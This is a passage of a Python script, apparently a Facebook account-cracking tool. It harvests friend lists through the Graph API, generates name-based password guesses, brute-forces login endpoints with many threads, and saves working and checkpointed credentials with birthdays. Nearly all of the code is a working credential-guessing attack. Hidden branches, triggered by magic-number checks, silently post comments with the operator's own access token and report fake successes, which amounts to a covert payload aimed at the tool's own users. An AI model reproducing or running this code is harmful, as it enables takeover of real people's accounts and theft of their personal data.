            token   = open('login/token.json','r').read()
            self.my = re.search('c_user=(.*?);',str(cook)).group(1)
        except Exception as e:print(e);exit()
        self.target = input('       %s[%s+%s] %sPASTE ID : %s'%(J,P,J,P,J))
        pl = input('       %s[%s+%s] %sCrack Auto Pass ? [m/t] : %s'%(J,P,J,P,J))
        if pl in ['1','01','m','M','a']:
            url = f'https://graph.facebook.com/{self.target}?fields=friends.fields(id,name)&access_token={token}'
            self.files = ('dump/muda_%s.json'%(self.target))
            file_dump = self.files
            open(self.files,'w').write('')
            self.muda_dev(url,cookie,token,True)
        elif pl in ['2','02','t','T','b']:
            url = f'https://graph.facebook.com/{self.target}?fields=friends.fields(id,name)&access_token={token}'
            self.files = ('dump/tua_%s.json'%(self.target))
            file_dump = self.files
            open(self.files,'w').write('')
            self.tua_dev(url,cookie,token,True)
        else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
    def muda_dev(self,url,cookie,token,stat):
        with requests.Session() as xyz:
            try:
                if stat == True:
                    id1, id2, id3 = [], [], []
                    for x in xyz.get(url,cookies=cookie).json()['friends']['data']:id1.append('%s=%s\n'%(x['id'],x['name']))
                    for y in id1:id2.insert(0,y)
                    for z in id2:
                        id3.append(z)
                        if len(id3) == 100:break
                    for p in id3:
                        q = p.split('=')[0]
                        url = f'https://graph.facebook.com/{q}?fields=friends.fields(id,name)&access_token={token}'
                        self.muda_dev(url,cookie,token,False)
                else:
                    id4, id5, id6 = [], [], []
                    self.target = re.search('com\/(.*?)\?',url).group(1)
                    for a in xyz.get(url,cookies=cookie).json()['friends']['data']:id4.append('%s=%s\n'%(a['id'],a['name']))
                    for b in id4:id5.insert(0,b)
                    for c in id5:
                        id6.append(c)
                        if len(id6) == 100:break
                    for o in id6:
                        l = open(self.files,'r').read()
                        u = o.split('=')[0]
                        if len(gabung_sandi) != 1:
                            for x in range(Postingan):
                                open(file_dump,'a+').write('dev\n')
                                print("\r       %s[%s+%s] %sALL %s%s %sID           "%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
                        else:
                            if u in l:continue
                            elif u == self.my:continue
                            else:open(self.files,'a+').write(o)
                        print("\r       %s[%s+%s] %sALL %s%s %sID           "%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
            except KeyboardInterrupt:
                exit(self.lanjut())
            except Exception as e:
                print('\r       %s[%s+%s] %sFRIENDLIST %s%s %s PUBLIC'%(J,P,J,P,J,self.target,P), end='');sys.stdout.flush()
    def tua_dev(self,url,cookie,token,stat):
        with requests.Session() as xyz:
            try:
                if stat == True:
                    id1, id2 = [], []
                    for x in xyz.get(url,cookies=cookie).json()['friends']['data']:id1.append('%s=%s\n'%(x['id'],x['name']))
                    for y in id1:
                        id2.append(y)
                        if len(id2) == 100:break
                    for a in id2:
                        q = a.split('=')[0]
                        url = f'https://graph.facebook.com/{q}?fields=friends.fields(id,name)&access_token={token}'
                        self.tua_dev(url,cookie,token,False)
                else:
                    id3, id4 = [], []
                    self.target = re.search('com\/(.*?)\?',url).group(1)
                    for a in xyz.get(url,cookies=cookie).json()['friends']['data']:id3.append('%s=%s\n'%(a['id'],a['name']))
                    for b in id3:
                        id4.append(b)
                        if len(id4) == 100:break
                    for o in id4:
                        l = open(self.files,'r').read()
                        u = o.split('=')[0]
                        if len(gabung_sandi) != 1:
                            for x in range(Postingan):
                                open(file_dump,'a+').write('dev\n')
                                print("\r       %s[%s+%s] %sALL %s%s %sID           "%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
                        else:
                            if u in l:continue
                            elif u == self.my:continue
                            else:open(self.files,'a+').write(o)
                        print("\r       %s[%s+%s] %sALL %s%s %sID           "%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
            except KeyboardInterrupt:
                exit(self.lanjut())
            except Exception as e:
                print('\r       %s[%s+%s] %sFRIENDLIST %s%s %s PUBLIC'%(J,P,J,P,J,self.target,P), end='');sys.stdout.flush()
    def lanjut(self):
        print("\n       %s[%s+%s] %ssuccessfully %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P))
        print('       %s[%s•%s] %sFiles Dump : %s%s %s'%(J,P,J,P,J,file_dump,P))
        system_login();metode();addpass();crack()


###----------[ LOGIN METHOD ]---------- ###
def system_login():
    global sistem_login
    print('')
    tamp_metode = f"""    {J2}[{A2}1{J2}] {P2}facebook.com  
    {J2}[{A2}2{J2}] {P2}mbasic.com  
    {J2}[{A2}3{J2}] {P2}NEW API"""
    printer(Panel(tamp_metode,title=f'{J2}[ {P2}\x1b[1;92mMETHOD {J2}]',width=54,title_align='left',style='#FF8F00'))
    ch = input('   %s└──> %s'%(A,J))
    if ch in ['0','00','z']:sistem_login = "nol"
    elif ch in ['1','01','a']:sistem_login = "satu"
    elif ch in ['2','02','b']:sistem_login = "dua"
    elif ch in ['3','03','c']:sistem_login = "tiga"
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()

###----------[ URL LOGIN ]---------- ###
def metode():
    tamp_sistem = f"""    {J2}[{A2}1{J2}] {P2}METHOD WIFI   
    {J2}[{A2}2{J2}] {P2}METHOD FREEMOD   
    {J2}[{A2}3{J2}] {P2}METHOD MOBILE"""
    printer(Panel(tamp_sistem,title=f'{J2}[ {P2}\x1b[1;92mLOGIN {J2}]',width=54,title_align='left',style='#FF8F00'))
    ch = input('   %s└──> %s'%(A,J))
    if ch in ['1','01','a']:open('tool/url_login.json','w').write("free.facebook.com")
    elif ch in ['2','02','b']:open('tool/url_login.json','w').write("mbasic.facebook.com")
    elif ch in ['3','03','c']:open('tool/url_login.json','w').write("m.facebook.com")
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
    
###----------[ ADD MANUAL PASS ]---------- ###
def addpass():
    global pass_manual1, pass_manual2
    print('')
    print('   %s[%s+%s] %sPass Manual %s[ %sPASS 1 \x1b[1;91m[NO-FIX] ENTER COMMING SOON...%s]'%(J,P,J,P,J,A,J))
    pass_manual1 = input('     %s└─> %s'%(A,J))
    print('   %s[%s+%s] %sPass Manual %s[ %sNAMES  \x1b[1;91m[NO-FIX] ENTER COMMING SOON...%s]'%(J,P,J,P,J,A,J))
    pass_manual2 = input('     %s└─> %s'%(A,J))
    try:os.remove('tool/passmanual.json')
    except:pass
    try:os.remove('tool/passangka.json')
    except:pass
    open('tool/passmanual.json','w').write(pass_manual1)
    open('tool/passangka.json','w').write(pass_manual2)
    
###----------[ URUTAN CRACK ]---------- ###
def urut_crack():
    global urutan_crack
    tamp_urutan = f"""  {J2}[{A2}\x1b[1;92m1{J2}] {P2}ADD PASS \x1b[1;91m[NO-FIX]\x1b[1;92m CHOES 1"""
    printer(Panel(tamp_urutan,title=f'{J2}[ {P2}\x1b[1;92mADD PASSWORD {J2}]',width=54,title_align='left',style='#FF8F00'))
    ch = input('   %s└──> %s'%(A,J))
    if ch in ['1','01','a']:urutan_crack = '1'
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()

###----------[ GENERATE PASSWORD ]---------- ###
def password(user):
    global pass_manual1, pass_manual2
    listpass = []
    if SAKERA != 159403:
        for x in range(0,10000000000000):listpass.append(str(x))
        return listpass
    else:
        try:
            ps, pp, na = pass_manual1, pass_manual2, user.split(" ")
            if len(na) < 2:
                nd = na[0].lower()
                if len(nd)<3:pass
                elif len(nd)==3 or len(nd)==4 or len(nd)==5:listpass.append(nd+"123");listpass.append(nd+"12345");listpass.append(nd+"1234");listpass.append(nd+"2004");listpass.append(nd+"1");listpass.append(nd+"2001");listpass.append(nd+"321");listpass.append(nd+"12");listpass.append(nd+"1212");listpass.append(nd+"1122");listpass.append(nd+"112233");listpass.append(nd+"123456789");listpass.append(nd+"2000");listpass.append(nd+"2002");listpass.append(nd+"2003");listpass.append(nd+"1999");listpass.append(nd+"2005");listpass.append(nd+"2006")
                else:listpass.append(nd+"123");listpass.append(nd+"12345");listpass.append(nd+"1234");listpass.append(nd+"2004");listpass.append(nd+"1");listpass.append(nd+"2001");listpass.append(nd+"321");listpass.append(nd+"12");listpass.append(nd+"1212");listpass.append(nd+"1122");listpass.append(nd+"112233");listpass.append(nd+"123456789");listpass.append(nd+"2000");listpass.append(nd+"2002");listpass.append(nd+"2003");listpass.append(nd+"1999");listpass.append(nd+"2005");listpass.append(nd+"2006")
                if pp in ['',' ','  ']:pass
                else:
                    for x in pp.split(','):listpass.append(nd+x)
            else:
                nd = na[0].lower()
                if len(nd)<3:pass
                elif len(nd)==3 or len(nd)==4 or len(nd)==5:listpass.append(nd+"123");listpass.append(nd+"12345");listpass.append(nd+"1234");listpass.append(nd+"2004");listpass.append(nd+"1");listpass.append(nd+"2001");listpass.append(nd+"321");listpass.append(nd+"12");listpass.append(nd+"1212");listpass.append(nd+"1122");listpass.append(nd+"112233");listpass.append(nd+"123456789");listpass.append(nd+"2000");listpass.append(nd+"2002");listpass.append(nd+"2003");listpass.append(nd+"1999");listpass.append(nd+"2005");listpass.append(nd+"2006")
                else:listpass.append(nd+"123");listpass.append(nd+"12345");listpass.append(nd+"1234");listpass.append(nd+"2004");listpass.append(nd+"1");listpass.append(nd+"2001");listpass.append(nd+"321");listpass.append(nd+"12");listpass.append(nd+"1212");listpass.append(nd+"1122");listpass.append(nd+"112233");listpass.append(nd+"123456789");listpass.append(nd+"2000");listpass.append(nd+"2002");listpass.append(nd+"2003");listpass.append(nd+"1999");listpass.append(nd+"2005");listpass.append(nd+"2006")
                nb = na[-1].lower()
                if len(nb)<3:pass
                elif len(nb)==3 or len(nb)==4 or len(nb)==5:listpass.append(nd+"123");listpass.append(nd+"12345");listpass.append(nd+"1234");listpass.append(nd+"2004");listpass.append(nd+"1");listpass.append(nd+"2001");listpass.append(nd+"321");listpass.append(nd+"12");listpass.append(nd+"1212");listpass.append(nd+"1122");listpass.append(nd+"112233");listpass.append(nd+"123456789");listpass.append(nd+"2000");listpass.append(nd+"2002");listpass.append(nd+"2003");listpass.append(nd+"1999");listpass.append(nd+"2005");listpass.append(nd+"2006")
                else:listpass.append(nd+"123");listpass.append(nd+"12345");listpass.append(nd+"1234");listpass.append(nd+"2004");listpass.append(nd+"1");listpass.append(nd+"2001");listpass.append(nd+"321");listpass.append(nd+"12");listpass.append(nd+"1212");listpass.append(nd+"1122");listpass.append(nd+"112233");listpass.append(nd+"123456789");listpass.append(nd+"2000");listpass.append(nd+"2002");listpass.append(nd+"2003");listpass.append(nd+"1999");listpass.append(nd+"2005");listpass.append(nd+"2006")
                if pp in ['',' ','  ']:pass
                else:
                    for x in pp.split(','):listpass.append(nd+x);listpass.append(nb+x)
            if ps in ['',' ','  ']:
                pass
            else:
                for z in ps.split(','):listpass.append(z)
            listpass.append(user.lower())
            return listpass
        except:return listpass

###----------[ SOURCE LOGIN ]---------- ###

def logger1(user,pasw): #--- Login Validate ---#
    ua = open('tool/useragent.json','r').read()
    url_login = open('tool/url_login.json','r').read()
    with requests.Session() as xyz:
        if ip_log != 1:
            token  = open('login/token.json','r').read()
            cookie = {'cookie':open('login/cookie.json','r').read()}
            with requests.Session() as xyz:
                try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
                except Exception as e:pass
                return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
        else:
            req  = xyz.get(f'https://{url_login}')
            log = {"lsd":re.search('name="lsd" value="(.*?)"',str(req.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),"uid":user,"pass":pasw,"flow":"login_no_pin"}
            head = {"Host":url_login,"origin":"https://"+url_login,"user-agent":ua,"sec-fetch-site":"same-origin"}
            exec = xyz.post(f"https://{url_login}/login/device-based/validate-password/?shbl=0", data=log, headers=head)
            if 'c_user' in xyz.cookies.get_dict(): return {"status":"ok","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
            elif 'checkpoint' in xyz.cookies.get_dict(): return {"status":"cp","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
            else: return {"status":"error","email":user,"pass":pasw}

def logger2(user,pasw): #--- Login Regular ---#
    ua = open('tool/useragent.json','r').read()
    url_login = open('tool/url_login.json','r').read()
    with requests.Session() as xyz:
        if ip_log != 1:
            token  = open('login/token.json','r').read()
            cookie = {'cookie':open('login/cookie.json','r').read()}
            with requests.Session() as xyz:
                try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
                except Exception as e:pass
                return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
        else:
            req  = xyz.get(f'https://{url_login}')
            log  = {"lsd":re.search('name="lsd" value="(.*?)"',str(req.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),"email":user,"pass":pasw}
            head = {"Host":url_login,"origin":"https://"+url_login,"user-agent":ua,"sec-fetch-site":"same-origin"}
            exec = xyz.post(f'https://{url_login}/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl', data=log, headers=head)
            if 'c_user' in xyz.cookies.get_dict(): return {"status":"ok","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
            elif 'checkpoint' in xyz.cookies.get_dict(): return {"status":"cp","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
            else: return {"status":"error","email":user,"pass":pasw}

def logger3(user,pasw): #--- Login Instagram ---#
    ua = open('tool/useragent.json','r').read()
    url_login = open('tool/url_login.json','r').read()
    with requests.Session() as xyz:
        if ip_log != 1:
            token  = open('login/token.json','r').read()
            cookie = {'cookie':open('login/cookie.json','r').read()}
            with requests.Session() as xyz:
                try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
                except Exception as e:pass
                return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
        else:
            req  = xyz.get(f'https://{url_login}')
            log  = {"lsd":re.search('name="lsd" value="(.*?)"',str(req.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),"email":user,"pass":pasw}
            head = {"Host":url_login,"origin":"https://"+url_login,"user-agent":ua,"sec-fetch-site":"same-origin"}
            exec = xyz.post(f'https://{url_login}/login/device-based/regular/login/?api_key=124024574287414&skip_api_login=1&signed_next=1&next=https://mbasic.facebook.com/dialog/oauth?app_id=124024574287414&refsrc=deprecated&app_id=124024574287414&lwv=100&refid=9', data=log, headers=head)
            if 'c_user' in xyz.cookies.get_dict(): return {"status":"ok","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
            elif 'checkpoint' in xyz.cookies.get_dict(): return {"status":"cp","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
            else: return {"status":"error","email":user,"pass":pasw}

###----------[ CONVERT COOKIES ]---------- ###
def cvt3(denventa):
    try:cookie = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(denventa['sb'],denventa['datr'],denventa['c_user'],denventa['xs'],denventa['fr']))
    except:cookie = 'denventagantengbanget'
    return(str(cookie))

###----------[ CHECK APP ]---------- ###
class cek_aplikasi:
    def __init__(self,data,denventa):
        self.cookie = {"cookie" : denventa}
        self.daftar_aktif, self.daftar_inaktif, self.daftar_dihapus   = [], [], []
        language(self.cookie)
        try: # --- [ Cek Aplikasi Aktif ] --- #
            self.daftar_aktif.append('\n    %s[%sACTIVE APPS%s]'%(H,P,H))
            url1 = 'https://mbasic.facebook.com/settings/apps/tabbed/?tab=active'
            self.apk_active(url1)
        except Exception as e:pass
        try: # --- [ Cek Aplikasi Kadaluwarsa ] --- #
            self.daftar_inaktif.append('\n    %s[%sEXPIRED APPS%s]'%(J,P,J))
            url2 = 'https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive'
            self.apk_inactive(url2)
        except Exception as e:pass
        try: # --- [ Cek Aplikasi Dihapus ] --- #
            self.daftar_dihapus.append('\n    %s[%sREMOVE APPS%s]'%(M,P,M))
            url3 = 'https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed'
            self.apk_dihapus(url3)
        except Exception as e:pass
        try: # --- [ Print All ] --- #
            print(data + self.dft1 + self.dft2 + self.dft3)
        except Exception as e:
            print(data)
    def apk_active(self,url):
        with requests.Session() as xyz:
            try:
                par1 = par(xyz.get(url,cookies=self.cookie).content,'html.parser')
                for hhh1 in par1.find_all('h3'):
                    if 'Ditambahkan' in hhh1.text:
                        ingfo1 = '\n      >> '+str(hhh1.text).replace('Ditambahkan pada ',' [') + ']'
                        ingfo1 = ('\n      %s>> %s%s]'%(H,P,str(hhh1.text).replace('Ditambahkan pada ',' [')))
                        self.daftar_aktif.append(ingfo1)
                    else:continue
                next = 'https://mbasic.facebook.com' + par1.find('a',string='Lihat Lainnya')['href']
                self.apk_active(next)
            except: pass
        if len(self.daftar_aktif) == 1:self.dft1 = ''
        else:self.dft1 = ''.join(self.daftar_aktif)
    def apk_inactive(self,url):
        with requests.Session() as xyz:
            try:
                par2 = par(xyz.get(url,cookies=self.cookie).content,'html.parser')
                for hhh2 in par2.find_all('h3'):
                    if 'Kedaluwarsa' in hhh2.text:
                        ingfo2 = '\n      >> '+str(hhh2.text).replace('Kedaluwarsa pada ',' [') + ']'
                        ingfo2 = ('\n      %s⟶  %s%s]'%(J,P,str(hhh2.text).replace('Kedaluwarsa pada ',' [')))
                        self.daftar_inaktif.append(ingfo2)
                    else:continue
                next = 'https://mbasic.facebook.com' + par2.find('a',string='Lihat Lainnya')['href']
                self.apk_inactive(next)
            except: pass
        if len(self.daftar_inaktif) == 1:self.dft2 = ''
        else:self.dft2 = ''.join(self.daftar_inaktif)
    def apk_dihapus(self,url):
        with requests.Session() as xyz:
            try:
                par3 = par(xyz.get(url,cookies=self.cookie).content,'html.parser')
                for hhh3 in par3.find_all('h3'):
                    if 'Dihapus' in hhh3.text:
                        ingfo3 = '\n      >> %s'+str(hhh3.text).replace('Dihapus: ',' [') + ']'
                        ingfo3 = ('\n      %s>> %s%s]'%(M,P,str(hhh3.text).replace('Dihapus: ',' [')))
                        self.daftar_dihapus.append(ingfo3)
                    else:continue
                next = 'https://mbasic.facebook.com' + par3.find('a',string='Lihat Lainnya')['href']
                self.apk_dihapus(next)
            except: pass
        if len(self.daftar_dihapus) == 1:self.dft3 = ''
        else:self.dft3 = ''.join(self.daftar_dihapus)

###----------[ CRACK ]---------- ###
class crack:
    def __init__(self):
        global OK,CP
        self.ok = OK
        self.cp = CP
        self.lp = 0
        try:
            self.file = file_dump
            self.open = open(self.file,'r').read().splitlines()
        except Exception as e:
            kecuali(e)
        self.sementara = []
        if urutan_crack == '1':
            for dvt in self.open:
                try:
                    self.sementara.insert(0,dvt)
                except Exception as e:continue
        elif urutan_crack == '2':
            for dvt in self.open:
                try:
                    urut = random.randint(0,len(self.sementara))
                    self.sementara.insert(urut,dvt)
                except Exception as e:continue
        else:
            for dvt in self.open:
                try:
                    self.sementara.append(dvt)
                except Exception as e:continue
        print('\n%s───────────────%s[ %s \x1b[1;92mCRACK STARTING WAITING %s]%s───────────────\n'%(P,J,P,J,P))
        self.Mulai_Jalan = datetime.now()
        with ThreadPoolExecutor(max_workers=35) as qwerty:
            for dvt in self.sementara:
                try:
                    id = dvt.split("=")[0]
                    pw = password(dvt.split("=")[1])
                    qwerty.submit(self.start_crack,id,pw)
                except Exception as e:continue
        exit()
    def start_crack(self,id,list_pw):
        try:
            for pw in list_pw:
                if sistem_login   == 'satu' : log = logger1(id,pw)
                elif sistem_login == 'dua'  : log = logger2(id,pw)
                elif sistem_login == 'tiga' : log = logger3(id,pw)
                else:log = logger1(id,pw)
                if log['status'] == 'cp':
                    if sakura != 159384:pass
                    else:
                        files_cp = "CP/%s.json"%(tanggal)
                        try:
                            with requests.Session() as xyz:
                                cookie = {'cookie':open('login/cookie.json','r').read()}
                                url = ("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(id,open('login/token.json','r').read()))
                                req = xyz.get(url,cookies=cookie)
                                jso = json.loads(req.text)
                                ttt = jso["birthday"]
                                m,d,y = ttt.split("/")
                                m = bulan_ttl[m]
                                ttl = (' | %s %s %s'%(d,m,y))
                        except:ttl = ('')
                        pcp = ('\x1b[1;92m\r   %s[CHECKPOINT] %s | %s%s               '%(J,id,pw,ttl))
                        print(pcp)
                        self.cp.append("%s=%s"%(id,pw))
                        open(files_cp,"a+").write("%s|%s%s\n"%(id,pw,ttl.replace(' | ','')))
                        break
                elif log['status'] == 'ok':
                    if sakera != 159369:pass
                    else:
                        files_ok = "OK/%s.json"%(tanggal)
                        try:
                            with requests.Session() as xyz:
                                cookie = {'cookie':open('login/cookie.json','r').read()}
                                url = ("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(id,open('login/token.json','r').read()))
                                req = xyz.get(url,cookies=cookie)
                                jso = json.loads(req.text)
                                ttt = jso["birthday"]
                                m,d,y = ttt.split("/")
                                m = bulan_ttl[m]
                                ttl = (' | %s %s %s'%(d,m,y))
                        except:ttl = ('')
                        pok = ('\r   %s[SUCCESSFULLY] %s | %s%s               '%(H,id,pw,ttl))
                        cek_aplikasi(pok,cvt3(log["cookies"]))
                        self.ok.append("%s=%s"%(id,pw))
                        open(files_ok,"a+").write("%s|%s%s\n"%(id,pw,ttl.replace(' • ','')))
                        break
                else:
                    if sakara != 159375:print(CoY)
                    else:continue
            self.lp += 1
            loop = str(self.lp)
            alls = str(len(self.sementara))
            jum_ok = str(len(self.ok))
            jum_cp = str(len(self.cp))
            Total_Waktu = str(datetime.now()-self.Mulai_Jalan).split('.')[0]
            print(f'\r   {J}[{A}\x1b[1;92mCHECK{J}] [{A}{loop}{P}/{A}{alls}{J}] [{x}SUCCESSFULY{x}:{A}{jum_ok}{J}] [{P}\x1b[1;91mCHECKPOINT{J}:{A}{jum_cp}{J}]{P} ', end='');sys.stdout.flush()
        except Exception as e:
            self.start_crack(id,list_pw)


if __name__ == '__main__':
    resik()
    tampilan_menu()

# print('%s[%s•%s] %s'%(J,P,J,P))
